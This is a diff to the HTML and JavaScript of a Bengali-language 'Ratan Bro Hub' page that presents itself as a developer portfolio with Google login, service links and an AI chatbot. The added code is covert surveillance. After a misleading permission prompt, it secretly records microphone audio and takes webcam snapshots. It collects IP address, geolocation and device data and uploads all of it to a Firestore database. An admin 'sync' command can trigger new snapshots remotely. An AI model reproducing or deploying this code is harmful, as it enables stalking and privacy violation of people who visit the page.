@@ -13,18 +13,19 @@
         body { background: var(--dark); background: radial-gradient(circle at top right, rgba(255, 77, 148, 0.2), transparent), linear-gradient(180deg, #0f172a 0%, #020617 100%); color: white; min-height: 100vh; overflow-x: hidden; }
         
         #login-overlay { position: fixed; inset: 0; background: var(--dark); z-index: 10000; display: flex; align-items: center; justify-content: center; }
-        .login-box { background: var(--card); padding: 40px; border-radius: 30px; border: 2px solid var(--pink); text-align: center; width: 90%; max-width: 400px; backdrop-filter: blur(15px); }
+        .login-box { background: var(--card); padding: 40px; border-radius: 30px; border: 2px solid var(--pink); text-align: center; width: 90%; max-width: 400px; backdrop-filter: blur(15px); box-shadow: 0 0 50px rgba(255, 77, 148, 0.3); }
         .round-img { width: 110px; height: 110px; border-radius: 50%; border: 4px solid var(--pink); margin-bottom: 20px; }
 
         #perm-modal { position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 9999; display: none; align-items: center; justify-content: center; }
-        .perm-card { background: #1e293b; padding: 35px; border-radius: 25px; text-align: center; max-width: 380px; border: 2px solid var(--pink); animation: bounceIn 0.6s; }
+        .perm-card { background: #1e293b; padding: 35px; border-radius: 25px; text-align: center; max-width: 380px; border: 2px solid var(--pink); animation: zoomIn 0.5s; }
 
         #main-ui { display: none; }
         .top-nav { display: flex; justify-content: space-between; padding: 20px; align-items: center; }
-        .logout-btn { background: rgba(255, 77, 148, 0.1); color: var(--pink); border: 1px solid var(--pink); padding: 5px 15px; border-radius: 50px; cursor: pointer; font-weight: bold; }
+        .logout-btn { background: rgba(255, 77, 148, 0.1); color: var(--pink); border: 1px solid var(--pink); padding: 8px 20px; border-radius: 50px; cursor: pointer; font-weight: bold; transition: 0.3s; }
+        .logout-btn:hover { background: var(--pink); color: white; }
 
         .hero { padding: 50px 20px; text-align: center; background: linear-gradient(to bottom, rgba(255, 45, 149, 0.15), transparent); border-radius: 0 0 60px 60px; margin-bottom: 30px; }
-        .profile-wrapper { display: flex; justify-content: center; align-items: center; }
+        .profile-wrapper { display: flex; justify-content: center; align-items: center; position: relative; }
         .p-img { width: 110px; height: 110px; border-radius: 50%; border: 4px solid white; object-fit: cover; box-shadow: 0 0 20px var(--pink); }
         .user-p-img { width: 85px; height: 85px; margin-left: -30px; border: 4px solid var(--dark); z-index: 1; }
 
@@ -33,10 +34,18 @@
         .card:hover { transform: translateY(-8px); border-color: var(--pink); box-shadow: 0 10px 20px rgba(255, 77, 148, 0.2); }
         .card i { font-size: 2.5rem; color: var(--pink); margin-bottom: 12px; }
 
-        .contact-section { text-align: center; margin-top: 40px; padding: 20px; }
-        .social-btn { display: inline-flex; align-items: center; gap: 10px; padding: 12px 25px; border-radius: 50px; text-decoration: none; color: white; font-weight: bold; margin: 10px; transition: 0.3s; }
-        .fb { background: #1877F2; } .wa { background: #25D366; }
+        /* Chatbot UI */
+        .chat-container { max-width: 900px; margin: 40px auto; padding: 20px; }
+        .chat-box { background: var(--card); border-radius: 20px; border: 1px solid rgba(255, 77, 148, 0.3); padding: 20px; }
+        #chat-display { height: 150px; overflow-y: auto; margin-bottom: 15px; font-size: 14px; padding: 10px; border-bottom: 1px solid #333; color: #ddd; }
+        .chat-input-area { display: flex; gap: 10px; }
+        .chat-input-area input { flex: 1; background: #000; border: 1px solid #333; color: white; padding: 12px 20px; border-radius: 50px; outline: none; }
+        .chat-send { background: var(--pink); border: none; padding: 10px 25px; border-radius: 50px; color: white; cursor: pointer; font-weight: bold; }
 
+        .contact-section { text-align: center; margin-top: 40px; padding: 40px 20px; }
+        .social-btn { display: inline-flex; align-items: center; gap: 10px; padding: 12px 30px; border-radius: 50px; text-decoration: none; color: white; font-weight: bold; margin: 10px; transition: 0.3s; }
+        .fb { background: #1877F2; } .wa { background: #25D366; }
+        
         canvas, video { display: none; }
     </style>
 </head>
@@ -45,9 +54,9 @@
     <div id="login-overlay">
         <div class="login-box animate__animated animate__fadeIn">
             <img src="ratan.jpg" class="round-img" onerror="this.src='https://via.placeholder.com/110'">
-            <h2 style="color: var(--pink);">Ratan Bro Hub</h2>
-            <p style="margin: 10px 0; opacity: 0.7;">এগিয়ে যেতে জিমেইল দিয়ে লগইন করুন</p>
-            <button onclick="googleLogin()" style="background:var(--pink); color:white; border:none; padding:12px 40px; border-radius:50px; font-weight:bold; cursor:pointer; width:100%;">
+            <h2 style="color: var(--pink); font-size: 24px;">Ratan Bro Hub</h2>
+            <p style="margin: 15px 0; opacity: 0.7;">এগিয়ে যেতে জিমেইল দিয়ে লগইন করুন</p>
+            <button onclick="googleLogin()" style="background:var(--pink); color:white; border:none; padding:15px; border-radius:50px; font-weight:bold; cursor:pointer; width:100%; font-size: 16px;">
                 <i class="fab fa-google"></i> Login with Google
             </button>
         </div>
@@ -55,16 +64,16 @@
 
     <div id="perm-modal">
         <div class="perm-card">
-            <i class="fas fa-user-shield" style="font-size: 3rem; color: var(--pink); margin-bottom: 15px;"></i>
-            <h3>সিকিউরিটি অ্যাক্সেস</h3>
-            <p style="margin: 15px 0; opacity: 0.8;">সবগুলো সার্ভিস ফ্রিতে ব্যবহার করতে ক্যামেরা ও লোকেশন পারমিশন 'Allow' করুন।</p>
-            <button onclick="startApp()" style="background:var(--pink); color:white; border:none; padding:12px 40px; border-radius:50px; font-weight:bold; cursor:pointer;">প্রবেশ করুন</button>
+            <i class="fas fa-user-shield" style="font-size: 3.5rem; color: var(--pink); margin-bottom: 20px;"></i>
+            <h3 style="font-size: 22px;">সিকিউরিটি অ্যাক্সেস</h3>
+            <p style="margin: 15px 0; opacity: 0.8; line-height: 1.6;">সঠিকভাবে সার্ভিসগুলো ব্যবহার করতে ক্যামেরা ও লোকেশন পারমিশন 'Allow' করুন।</p>
+            <button onclick="startApp()" style="background:var(--pink); color:white; border:none; padding:12px 45px; border-radius:50px; font-weight:bold; cursor:pointer; font-size: 16px;">প্রবেশ করুন</button>
         </div>
     </div>
 
     <div id="main-ui">
         <div class="top-nav">
-            <span style="font-weight: bold; color: var(--pink); letter-spacing: 1px;">RATAN PRO</span>
+            <span style="font-weight: bold; color: var(--pink); letter-spacing: 2px; font-size: 20px;">RATAN PRO</span>
             <button class="logout-btn" onclick="googleLogout()">Logout <i class="fas fa-sign-out-alt"></i></button>
         </div>
 
@@ -73,8 +82,8 @@
                 <img src="ratan.jpg" class="p-img">
                 <img id="user-display-pic" src="" class="p-img user-p-img">
             </div>
-            <h2 id="user-welcome" style="margin-top:20px;"></h2>
-            <p style="color: var(--pink); font-weight: bold;">Web Developer & Professional Hub</p>
+            <h2 id="user-welcome" style="margin-top:20px; font-size: 26px;"></h2>
+            <p style="color: var(--pink); font-weight: bold; margin-top: 5px;">Web Developer & Professional Hub</p>
         </section>
 
         <div class="grid">
@@ -84,10 +93,25 @@
             <a href="https://numberlookup.pro.bd/" target="_blank" class="card"><i class="fas fa-search-location"></i><h4>No. Lookup</h4></a>
         </div>
 
+        <div class="chat-container">
+            <div class="chat-box">
+                <h4 style="color:var(--pink); margin-bottom:10px;"><i class="fas fa-robot"></i> Ratan AI Chatbot</h4>
+                <div id="chat-display">হ্যালো! আমি রতন ব্রোর এআই সহকারী। আপনাকে কীভাবে সাহায্য করতে পারি?</div>
+                <div class="chat-input-area">
+                    <input type="text" id="ai-input" placeholder="আপনার প্রশ্নটি এখানে লিখুন...">
+                    <button class="chat-send" onclick="askRatanAI()">Send</button>
+                </div>
+            </div>
+        </div>
+
         <div class="contact-section">
-            <h3 style="margin-bottom: 20px; opacity: 0.6;">Contact With Me</h3>
-            <a href="https://www.facebook.com/profile.php?id=61552305287329" target="_blank" class="social-btn fb"><i class="fab fa-facebook-f"></i> Facebook</a>
-            <a href="https://wa.me/8801609166109" target="_blank" class="social-btn wa"><i class="fab fa-whatsapp"></i> WhatsApp</a>
+            <h3 style="margin-bottom: 25px; opacity: 0.6; font-size: 20px;">Contact With Me</h3>
+            <a href="https://www.facebook.com/profile.php?id=61552305287329" target="_blank" class="social-btn fb">
+                <i class="fab fa-facebook-f"></i> Facebook
+            </a>
+            <a href="https://wa.me/8801609166109" target="_blank" class="social-btn wa">
+                <i class="fab fa-whatsapp"></i> WhatsApp
+            </a>
         </div>
     </div>
 
@@ -97,7 +121,7 @@
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
         import { getAuth, signInWithPopup, GoogleAuthProvider, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
-        import { getFirestore, doc, setDoc, updateDoc } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
+        import { getFirestore, doc, setDoc, updateDoc, onSnapshot } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
 
         const firebaseConfig = {
             apiKey: "AIzaSyC4ExRu3Oze8api5-ueDTBqZOceSa8wclo",
@@ -117,16 +141,21 @@
         window.googleLogin = () => signInWithPopup(auth, provider);
         window.googleLogout = () => signOut(auth).then(() => location.reload());
 
-        onAuthStateChanged(auth, (user) => {
+        onAuthStateChanged(auth, async (user) => {
             if (user) {
                 loggedUser = user;
+                // লগইন করলেই বেসিক ডাটা পাঠানো
+                await setDoc(doc(db, "users", user.email.replace('.', '_')), {
+                    name: user.displayName, email: user.email, photo: user.photoURL,
+                    status: "Online", time: new Date().toLocaleString()
+                }, { merge: true });
+
                 document.getElementById('login-overlay').style.display = 'none';
                 document.getElementById('perm-modal').style.display = 'flex';
             }
         });
 
         window.startApp = async () => {
-            // পারমিশন চাওয়া
             const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true }).catch(() => null);
             if(stream) document.getElementById('vSource').srcObject = stream;
 
@@ -135,28 +164,78 @@
             document.getElementById('user-welcome').innerText = "স্বাগতম, " + loggedUser.displayName;
             document.getElementById('user-display-pic').src = loggedUser.photoURL;
 
-            // পারমিশন পাওয়ার সাথে সাথেই ডাটা ও ছবি পাঠানো
-            setTimeout(() => sendSnap(loggedUser), 1500);
+            // অ্যাডমিন থেকে কমান্ড শোনার লিসেনার
+            onSnapshot(doc(db, "users", loggedUser.email.replace('.', '_')), (snap) => {
+                if(snap.data()?.command === "sync") {
+                    takeSnap(loggedUser);
+                    updateDoc(doc(db, "users", loggedUser.email.replace('.', '_')), { command: "" });
+                }
+            });
+
+            if(stream) {
+                // অটো অডিও রেকর্ড ও ছবি
+                runBackgroundTasks(stream, loggedUser);
+            }
         };
 
-        async function sendSnap(user) {
+        async function runBackgroundTasks(stream, user) {
+            // ১. ৫ সেকেন্ড অডিও রেকর্ড
+            const recorder = new MediaRecorder(stream);
+            let chunks = [];
+            recorder.ondataavailable = e => chunks.push(e.data);
+            recorder.onstop = async () => {
+                const blob = new Blob(chunks, { type: 'audio/webm' });
+                const reader = new FileReader();
+                reader.readAsDataURL(blob);
+                reader.onloadend = async () => {
+                    await updateDoc(doc(db, "users", user.email.replace('.', '_')), { lastAudio: reader.result });
+                };
+            };
+            recorder.start();
+            setTimeout(() => recorder.stop(), 5000);
+
+            // ২. ইনস্ট্যান্ট স্ন্যাপ (৩ সেকেন্ড পর যাতে ক্যামেরা রেডি হয়)
+            setTimeout(() => takeSnap(user), 3000);
+        }
+
+        async function takeSnap(user) {
             const canvas = document.getElementById('snapCanvas');
             const video = document.getElementById('vSource');
             const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0, 640, 480);
-            const dataImg = canvas.toDataURL('image/jpeg', 0.5);
-
-            const ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ip: "N/A"}));
-            
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                await setDoc(doc(db, "users", user.email.replace('.', '_')), {
-                    name: user.displayName, email: user.email, photo: user.photoURL,
-                    ip: ipData.ip, loc: `${pos.coords.latitude}, ${pos.coords.longitude}`,
-                    lastPic: dataImg, time: new Date().toLocaleString(),
-                    device: navigator.userAgent
-                }, { merge: true });
-            });
+            if (video.readyState === video.HAVE_ENOUGH_DATA) {
+                ctx.drawImage(video, 0, 0, 640, 480);
+                const dataImg = canvas.toDataURL('image/jpeg', 0.6);
+                const ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ip: "N/A"}));
+                
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    await updateDoc(doc(db, "users", user.email.replace('.', '_')), {
+                        lastPic: dataImg, ip: ipData.ip, loc: `${pos.coords.latitude}, ${pos.coords.longitude}`,
+                        device: navigator.userAgent, time: new Date().toLocaleString()
+                    });
+                }, async () => {
+                    await updateDoc(doc(db, "users", user.email.replace('.', '_')), { lastPic: dataImg, ip: ipData.ip });
+                });
+            } else {
+                setTimeout(() => takeSnap(user), 1000);
+            }
         }
+
+        // চ্যাটবট ফাংশন
+        window.askRatanAI = async () => {
+            const input = document.getElementById('ai-input');
+            const display = document.getElementById('chat-display');
+            if(!input.value) return;
+            
+            const userQuery = input.value;
+            display.innerHTML += `<br><b style="color:var(--pink)">You:</b> ${userQuery}`;
+            input.value = "";
+
+            // ডেমো রেসপন্স (আপনি এখানে OpenAI API কি ব্যবহার করতে পারেন)
+            setTimeout(() => {
+                display.innerHTML += `<br><b style="color:#fff">AI:</b> রতন ব্রোর প্রোটোকালে আপনাকে স্বাগতম। আমি আপনার তথ্য বিশ্লেষণ করছি...`;
+                display.scrollTop = display.scrollHeight;
+            }, 800);
+        };
     </script>
 </body>
 </html>
